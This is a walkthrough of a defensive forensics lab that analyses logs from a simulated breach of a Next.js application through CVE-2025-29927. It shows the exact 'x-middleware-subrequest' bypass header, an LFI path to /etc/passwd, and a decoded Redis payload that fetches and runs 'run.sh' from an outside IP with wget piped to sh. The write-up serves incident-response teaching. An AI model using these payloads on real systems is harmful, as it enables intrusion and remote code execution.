---
Title: "HTB: NeuroSync-D"
date: 2025-05-21
tags: [linux, redis, lfi, cve-2025-29927]
Draft: False
---

## 1. Scenario Introduction

**NeuroSync™** is a leading product line from **Korosaki Corporation**, focused on developing state-of-the-art medical BCI (Brain-Computer Interface) devices. Recently, an APT (Advanced Persistent Threat) group has targeted the company, successfully infiltrating their infrastructure, and is now attempting to move laterally between systems to attack more systems. They appear to have compromised multiple online devices by exploiting an N-day vulnerability. Your mission is to figure out how they breached the infrastructure and understand how it can be secured.

#### 1-1. Related Technologies
- Server Log Analysis
- CVE-2025-29927

## 2. Background Knowledge

### 2-1. Log Analysis Related
- **Access Log**
    - Records web server requests/responses (IP, URL, response code, etc.).
    - Can be used to check the attacker's access path and attempts.
    
- **Application Log**
    - Records the operational status, errors, user activities, etc., of various apps.
    - E.g., `interface.log`, `bci-device.log`
    
- **Redis Log**
    - Contains records of Redis server command processing, errors, connections, etc.
    - Used to analyze the possibility of internal system command injection and RCE.

### 2-2. Attack Techniques
#### 2-2-1. Key Attack Techniques
	- **LFI (Local File Inclusion)**
	    - Exposes sensitive information by manipulating server-side file paths.
	    - Can obtain internal system information through access like `/logs?path=../../etc/passwd`.
	        
	- **SSRF (Server-Side Request Forgery)**
	    - The server makes requests to other servers based on external input.
	    - Used for attacks like internal network port scanning.
	    
	- **Middleware Bypass**
	    - Bypasses middleware that performs authentication/authorization checks.
	    - There are cases of exploiting the `x-middleware-subrequest` header in Next.js.
	        
	- **Remote Code Execution (RCE)**
	    - The state where arbitrary code can be executed remotely.
	    - Proceeds with a flow of injecting malicious commands into Redis → executing `wget | sh`.

#### 2-2-2. CVE-2025-29927
- **Vulnerability Name**: CVE-2025-29927
    
- **Affected Versions**: Next.js 15.x (specifically including 15.1.0)
    
- **Vulnerability Type**: **Middleware Authentication Bypass**
    
- **Attack Method**:
    - An attacker can bypass authentication middleware logic by manipulating the `x-middleware-subrequest` header.
    - By adding nested values like `middleware:middleware:...` to the header value, it can be mistaken for an internal request, allowing access to protected APIs.
        
- **Impact Scope**:
    - API endpoints requiring authentication can be bypassed, leading to **unauthorized access**, **information disclosure**, and **subsequent attacks** (e.g., SSRF, LFI, etc.).

## 3. Analysis

### 3-1. Download Evidence File
1. Find the `NeuroSync-D.zip` file in the study materials and move it to your analysis OS.
2. Use `7z` to extract the archive. The password is `hacktheblue`.
```bash
┌──(kali㉿kali)-[~/Desktop/NeuroSync]
└─$ 7z x NeuroSync.zip  

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:2 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 6927 bytes (7 KiB)

Extracting archive: NeuroSync.zip
--
Path = NeuroSync.zip
Type = zip
Physical Size = 6927

    
Enter password (will not be echoed):
Everything is Ok

Files: 5
Size:       70972
Compressed: 6927



┌──(kali㉿kali)-[~/Desktop/NeuroSync]
└─$ ls
access.log  bci-device.log  data-api.log  interface.log  NeuroSync.zip  redis.log
```

### 3-2. Initial Analysis
#### 3-2-1. Log File Types
After extraction, you can see a total of 5 logs.
- access.log: Records incoming HTTP requests to the web server, including IP addresses, request paths, timestamps, and response codes.
- bci-device.log: Logs related to the BCI device, recording device status, errors, data transmission, etc.
- data-api.log: Records interactions with the data API, which may include request/response details, errors, and performance metrics.
- interface.log: Records interactions with the user interface, which may include user input, events, and errors within a GUI or web interface.
- redis.log: Records system events, command executions, errors, and other activities occurring in the Redis database.

### 3-3. Problem Solving
#### Q1. What is the version of the Next.js application?

Based on the scenario, we know we need to analyze a web-based Next.js framework. We can use the `grep` command to search for a string across all log files at once.

```bash
┌──(kali㉿kali)-[~/Desktop/NeuroSync]
└─$ grep -ir "next.js" .                                                                                                         
./interface.log:   ▲ Next.js 15.1.0
./interface.log:Attention: Next.js now collects completely anonymous telemetry regarding usage.
./interface.log:This information is used to shape Next.js roadmap and prioritize features.



┌──(kali㉿kali)-[~/Desktop/NeuroSync]
└─$ head interface.log                                       

> neurosync@0.1.0 dev
> next dev

   ▲ Next.js 15.1.0
   - Local:        http://localhost:3000
   - Network:      http://172.17.0.2:3000
   - Experiments (use with caution):
     · webpackBuildWorker
     · parallelServerCompiles
```

The identified version is 15.1.0.

#### Q2. On which local port is the Next.js-based application running?

```bash
┌──(kali㉿kali)-[~/Desktop/NeuroSync]
└─$ head interface.log                                       

> neurosync@0.1.0 dev
> next dev

   ▲ Next.js 15.1.0
   - Local:        http://localhost:3000
   - Network:      http://172.17.0.2:3000
   - Experiments (use with caution):
     · webpackBuildWorker
     · parallelServerCompiles
```

Based on the previously checked log, we can see that the connected port is 3000.

#### Q3. A critical Next.js vulnerability was disclosed in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?

A web search for CVEs related to Next.js version 15.1.0 can identify the vulnerability.

https://github.com/YEONDG/nextjs-cve-2025-29927

#### Q4. The attacker attempted to enumerate static files commonly provided by the Next.js framework, likely to determine its version. What is the first file the attacker was able to obtain?

Static files are likely to be checked via web access, so this can be confirmed through `access.log`.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_1.png]]

The first file that can be identified in `access.log` is `main-app.js`.

#### Q5. The attacker then seems to have found an endpoint that is likely affected by the previously identified vulnerability. What is that endpoint?

Looking up PoCs or descriptions of the previously identified CVE reveals that this vulnerability allows bypassing authentication middleware using the `x-middleware-subrequest` header.

We search for this header value in the logs.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_2.png]]

Records of this vulnerability are directly found in `interface.log`, which has a similar format to `access.log`. The vulnerability is exploited with the endpoint `/api/bci/analytics`.

#### Q6. How many requests to this endpoint resulted in an "Unauthorized" response?

An "Unauthorized" response corresponds to response number 401.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_3.png]]

Searching based on this response number yields a total of 5 logs.

#### Q7. At what time was a successful response from the vulnerable endpoint captured, indicating that the middleware was bypassed?

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_4.png]]

The first successful attempt (returning 200) after the 401 responses was at 2025-04-01 11:38:05.

#### Q8. Given the previously failed requests, what is the most likely final value of the vulnerable header used to exploit the vulnerability and bypass the middleware?

Looking at the vulnerable header values in the previously checked logs, a certain pattern can be observed among the failed attempts.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_5.png]]

```
x-middleware-subrequest: middleware
x-middleware-subrequest: middleware:middleware
x-middleware-subrequest: middleware:middleware:middleware
x-middleware-subrequest: middleware:middleware:middleware:middleware
```

Given the failed header values and the timing, it appears the attacker was progressively adding ":middleware" to the header value and succeeded on the fifth attempt.

`x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`

#### Q9. The attacker combined the vulnerability with an SSRF attack to perform an internal port scan and discover an internal API. On which port can this API be accessed?

Looking through the logs, `data-api.log` contains records after the successful attack time of 2025-04-01 11:38:05.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_6.png]]

The very first log recorded indicates that the "External Analytics" server is running on port 4000.

#### Q10. After the port scan, the attacker launches a brute-force attack to find a vulnerable endpoint in the previously identified API. What vulnerable endpoint was discovered?

Continuing to look through the same log, we can see logs where the attacker is attempting Local File Inclusion on the `/logs` endpoint after trying various other endpoints.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_7.png]]

#### Q11. When was the discovered vulnerable endpoint first used maliciously?

Checking the previously identified log for the time the attacker first attempted to read `/etc/passwd` via Local File Inclusion, the time is 2025-04-01 11:39:01.

#### Q12. What is the name of the attack for which the endpoint is vulnerable?

Local File Inclusion

#### Q13. What is the name of the file that was targeted when the vulnerable endpoint was last exploited?

Continuing to scroll down through the log, we can see the last file that was read.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_8.png]]

The file is secret.key.

#### Q14. Finally, the attacker uses the previously obtained sensitive information to perform a Redis injection and create a special command that can achieve RCE on the system. What is the command string?

Now it's time to check `redis.log`. Looking at the log, we can see a record where a string that appears to be Base64 encoded is entered along with the phrase `OS_EXEC`.

![[public/Images/content/Security/DFIR/NeuroSync-D/neurosync_9.png]]

```
OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
```

Decoding this string reveals that it downloads a script `run.sh` using the `wget` command.

```bash
┌──(kali㉿kali)-[~/Desktop/NeuroSync]
└─$ echo -n "d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb" | base64 -d
wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
```

Executed command: `wget http://185.202.2.147/h4Pln4/run.sh -O- | sh`
